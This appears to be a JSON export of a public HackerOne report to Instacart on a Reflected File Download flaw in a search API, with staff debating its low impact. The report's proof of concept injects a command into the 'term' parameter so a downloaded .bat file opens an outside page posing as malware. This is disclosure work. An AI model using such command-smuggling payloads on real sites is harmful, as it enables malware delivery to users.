@@ -1,0 +1,431 @@
+{
+    "id": 158505,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTg1MDU=",
+    "url": "https://hackerone.com/reports/158505",
+    "title": "Reflected File Download on recipe list search",
+    "state": "Closed",
+    "substate": "informative",
+    "readable_substate": "Informative",
+    "created_at": "2016-08-11T16:00:44.010Z",
+    "submitted_at": "2016-08-11T16:00:44.010Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "dsopas",
+        "url": "/dsopas",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 35527,
+        "url": "https://hackerone.com/instacart",
+        "handle": "instacart",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/o3gb7jh208og9ikm1jqbsj1461p5/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/o3gb7jh208og9ikm1jqbsj1461p5/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Instacart",
+            "twitter_handle": "instacart",
+            "website": "https://instacart.com",
+            "about": ""
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2016-10-18T01:08:16.349Z",
+    "bug_reporter_agreed_on_going_public_at": "2016-10-13T19:06:03.448Z",
+    "team_member_agreed_on_going_public_at": "2016-10-18T01:08:16.320Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Hi guys,\n\nRight now I'm searching for JSON issues on your API so I started to go deep into the XHR requests.\nWhen I noticed the following request:\nhttps://www.instacart.com/api/v2/searches?cart_id=3471936&term=rfd&page=1&per=100&max_per_row=7&skip_other_warehouses=true&disable_autocorrect=false&source=web&warehouse_id=129&zone_id=12\n\nWhich returned the following output:\n\n{\"meta\":{\"code\":200,\"source\":\"search_service\",\"cluster\":null},\"data\":{\"term\":\"xss\",\"inventory_area_id\":617,\"items\":[],\"total_results\":0,\"aisles\":[],\"warehouses\":[],\"search_strategies\":[],\"tracking\":{},\"product_type_filter\":false,\"has_deals\":false,\"search_id\":141585110},\"pagination\":{\"total\":0,\"page\":1,\"per_page\":50}}\n\nI noticed that \"term\" parameter was reflected on the JSON format output so I tried a Reflected File Download.\n\nProof-of-concept:\nhttps://www.instacart.com/api/v2/searches.bat?cart_id=&term=\"||start chrome davidsopas.com/poc/malware.htm||&page=1&per=100&max_per_row=7&skip_other_warehouses=true&disable_autocorrect=false&source=web&warehouse_id=129&zone_id=12\n\nReflecting:\n{\"meta\":{\"code\":200,\"source\":\"search_service\",\"cluster\":null},\"data\":{\"term\":\"\\\"||start chrome davidsopas.com/poc/malware.htm||\",\"inventory_area_id\":617,\"items\":[],\"total_results\":0,\"aisles\":[],\"warehouses\":[],\"search_strategies\":[\"used_or_operator\"],\"tracking\":{},\"product_type_filter\":false,\"has_deals\":false,\"search_id\":141585846},\"pagination\":{\"total\":0,\"page\":1,\"per_page\":50}}\n\nSo I got my RFD attack now (even with URL permissive), next step was to create a special crafted page to force the download:\nhttp://0xhack.com/instacart_rfd.htm\n\nNote: You need to be authenticated with a Instacart account.\n\nCheck the attached screenshots on latest versions of Chrome and Opera.\n\nSo in my proof-of-concept I was able to run a new Google Chrome window with a html file simulating a malicious file on the Windows operative system.\n\nA malicious user could:\n\n1 - Launch a malicious campaign with the specially crafted page - similar to my PoC\n2 - Victim downloads the file thinking that is from a trusted domain [instacart.com]\n3 - Malicious user gains control over victims machine\n\nThis kind of attack is very dangerous and could lead to millions of users infected by malicious campaigns. Possibility of gaining operating system access from Instacart users is a high risk of security.\n\nSolution:\nUse content-disposition header to force a filename download. Also \"term\" parameter should be encoded to prevent this kind of reflection on the output.\n\nHope it helps.\n\nBest,\nDavid Sopas\n@dsopas",
+    "weakness": {
+        "id": 58,
+        "name": "Command Injection - Generic"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 111452,
+            "file_name": "instacart_rfd_opera.jpg",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/111/452/caac0293b0036666a4d065044e3cadba47a60d47/instacart_rfd_opera.jpg?response-content-disposition=attachment%3B%20filename%3D%22instacart_rfd_opera.jpg%22%3B%20filename%2A%3DUTF-8%27%27instacart_rfd_opera.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T081002Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a6841d848432382888c06c585aef836f9a2c3b9135fb7cff9c9ab0b0dc9319b3",
+            "file_size": 64259,
+            "type": "image/jpeg"
+        },
+        {
+            "id": 111453,
+            "file_name": "instacart_rfd_chrome.jpg",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/111/453/46ca95e0d714aa04718f9e2f6fc3a0f07a5ee57d/instacart_rfd_chrome.jpg?response-content-disposition=attachment%3B%20filename%3D%22instacart_rfd_chrome.jpg%22%3B%20filename%2A%3DUTF-8%27%27instacart_rfd_chrome.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T081002Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e520afe67eca09cc6c112f08f81832d442a5c36eb06c40475ac33b6697a4cd95",
+            "file_size": 26546,
+            "type": "image/jpeg"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 6,
+    "voters": [
+        "dsopas",
+        "0nlymohammed",
+        "exception",
+        "spetr0x",
+        "nicktp",
+        "harrykun18"
+    ],
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 1127898,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Thanks @dsopas. We'll take a look and update you as soon as we have more information.",
+            "automated_response": false,
+            "created_at": "2016-08-15T20:37:56.775Z",
+            "updated_at": "2016-08-15T20:37:56.775Z",
+            "actor": {
+                "username": "mikeinstacart",
+                "cleared": false,
+                "verified": false,
+                "url": "/mikeinstacart",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "instacart"
+        },
+        {
+            "id": 1128691,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@mikeinstacart thanks for the fast reply. Feel free tp contact me if you need further assistance.\n\nBest,\nDavid Sopas\n@dsopas",
+            "automated_response": false,
+            "created_at": "2016-08-16T06:48:00.353Z",
+            "updated_at": "2016-08-16T06:48:00.353Z",
+            "actor": {
+                "username": "dsopas",
+                "cleared": false,
+                "verified": false,
+                "url": "/dsopas",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "instacart"
+        },
+        {
+            "id": 1172275,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2016-09-04T08:01:25.841Z",
+            "updated_at": "2016-09-04T08:01:25.841Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 165134
+            },
+            "actor": {
+                "username": "cablej",
+                "cleared": true,
+                "verified": true,
+                "url": "/cablej",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/042/859/7fdafea90092a305ae2cb6cec7d43461783abf0c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "instacart"
+        },
+        {
+            "id": 1173555,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "If you need any further assistance do let me know.\n\nBest,\nDavid Sopas\n@dsopas",
+            "automated_response": false,
+            "created_at": "2016-09-05T08:56:25.158Z",
+            "updated_at": "2016-09-05T08:56:25.158Z",
+            "actor": {
+                "username": "dsopas",
+                "cleared": false,
+                "verified": false,
+                "url": "/dsopas",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "instacart"
+        },
+        {
+            "id": 1237787,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2016-10-07T19:07:31.664Z",
+            "updated_at": "2016-10-07T19:07:31.664Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 174461
+            },
+            "actor": {
+                "username": "a0xnirudh",
+                "cleared": false,
+                "verified": false,
+                "url": "/a0xnirudh",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/891/b9be8d32dadcaa814c6bf85eceef7fdf9fa38f41_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "instacart"
+        },
+        {
+            "id": 1246505,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "Hi @dsopas. I am closing this as informative. After reviewing the issue internally, we agree with Google's assessment on these types of attacks: https://sites.google.com/site/bughunteruniversity/nonvuln/reflected-file-download.\n\nWe appreciate the report!",
+            "automated_response": false,
+            "created_at": "2016-10-13T18:45:09.087Z",
+            "updated_at": "2016-10-13T18:45:09.087Z",
+            "actor": {
+                "username": "mikeinstacart",
+                "cleared": false,
+                "verified": false,
+                "url": "/mikeinstacart",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "instacart"
+        },
+        {
+            "id": 1246554,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @mikeinstacart \nIn my opinion you're wrong because it something you guys can fix and prevent from happening. It can affect your users and all I did was report a security issue that will make your web application more secure.\n\nIf you still think this is something that didn't desert your time fixing I'll respect because in the end is your decision not mine.\n\nThanks for your time.",
+            "automated_response": false,
+            "created_at": "2016-10-13T19:05:48.787Z",
+            "updated_at": "2016-10-13T19:05:48.787Z",
+            "actor": {
+                "username": "dsopas",
+                "cleared": false,
+                "verified": false,
+                "url": "/dsopas",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "instacart"
+        },
+        {
+            "id": 1246555,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2016-10-13T19:06:03.474Z",
+            "updated_at": "2016-10-13T19:06:03.474Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "dsopas",
+                "cleared": false,
+                "verified": false,
+                "url": "/dsopas",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "instacart"
+        },
+        {
+            "id": 1249483,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@dsopas I would not say you are wrong. But whether RFD is an important problem is controversial at best.\n\nThe google assessment has some persuasive points:\n* User trusts the site hosting the link, rather than the url of the link.\n* To carry out social engineering attacks, google article showed better and simpler methods that can not be fixed by the website owner. (Why would hackers even bother looking for an RFD?)\n\nYou think we are wrong because\n> \"it (is) something you guys can fix and prevent from happening.\".\n\nYes. We do agree that this is probably missing best practice. We are continuously improving our security protection, at the same time we also understand the security implication of each practice missing.  There are other endpoints that could have similar issues, if we want to add it, we may have to do it systematically, not just for single API. Fixing it is not just adding a header, it also requires confirmation of such change is working on multiple applications and platforms, which could be quite some work for a low impact problem.\n\n> \"It can affect your users and all I did was report a security issue that will make your web application more secure.\"\n\nIMHO this is not true, there are easier ways to carry out similar social engineering attacks that cant be fixed (provided by google's article). Fixing it does not improve security over all (leaky bucket theory).\n\nCombining these reasons, I would consider RFD is a problem with very little impact but requires quite some work to fix.\n\nThat said, we really appreciate your detailed report! If at some point we decide to proceed adding the header (systematically of course), we will for sure find out this report and change the status to \"Resolve\". Thank you again for your time.",
+            "automated_response": false,
+            "created_at": "2016-10-16T06:33:34.774Z",
+            "updated_at": "2016-10-16T06:41:08.474Z",
+            "actor": {
+                "username": "cxmcc-instacart",
+                "cleared": false,
+                "verified": false,
+                "url": "/cxmcc-instacart",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "instacart"
+        },
+        {
+            "id": 1250415,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @cxmcc-instacart \n\nThanks for the time giving your feedack regarding your issue. \nMost of your opinion was based on Google perspective. Just to let you know that other companies like Microsoft, Yahoo!, eBay, PayPal and many others consider this to be a medium level security risk.\n\nFeel free to read if you have time:\nhttps://www.davidsopas.com/why-some-vendors-ignore-rfd-attacks/\n\nAnd the original Oren Hafif article about RFD:\nhttps://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf\nhttps://drive.google.com/file/d/0B0KLoHg_gR_XQnV4RVhlNl96MHM/view\n\nAgain thanks for your time.\nCan we make this report public like I requested?\n\nBest,\nDavid Sopas\n@dsopas",
+            "automated_response": false,
+            "created_at": "2016-10-17T09:03:48.750Z",
+            "updated_at": "2016-10-17T09:03:48.750Z",
+            "actor": {
+                "username": "dsopas",
+                "cleared": false,
+                "verified": false,
+                "url": "/dsopas",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "instacart"
+        },
+        {
+            "id": 1252201,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2016-10-18T01:08:16.336Z",
+            "updated_at": "2016-10-18T01:08:16.336Z",
+            "actor": {
+                "username": "cxmcc-instacart",
+                "cleared": false,
+                "verified": false,
+                "url": "/cxmcc-instacart",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "instacart"
+        },
+        {
+            "id": 1252202,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2016-10-18T01:08:16.363Z",
+            "updated_at": "2016-10-18T01:08:16.363Z",
+            "actor": {
+                "username": "cxmcc-instacart",
+                "cleared": false,
+                "verified": false,
+                "url": "/cxmcc-instacart",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "instacart"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "id": 2808,
+            "category": "team",
+            "content": "We basically agree with google's assessment on RFD: https://sites.google.com/site/bughunteruniversity/nonvuln/reflected-file-download\nWe consider Reflected File Download as a low impact attack that requires social engineering efforts.",
+            "user": {
+                "id": 84123,
+                "username": "cxmcc-instacart",
+                "name": "Xiuming Chen",
+                "bio": "",
+                "cleared": false,
+                "verified": false,
+                "website": null,
+                "location": "",
+                "created_at": "2016-06-10T16:06:15.233Z",
+                "url": "https://hackerone.com/cxmcc-instacart",
+                "hackerone_triager": false,
+                "hackerone_employee": false,
+                "user_type": "hacker",
+                "profile_picture_urls": {
+                    "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
+                    "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                }
+            },
+            "can_view?": true,
+            "can_create?": false,
+            "attachments": []
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
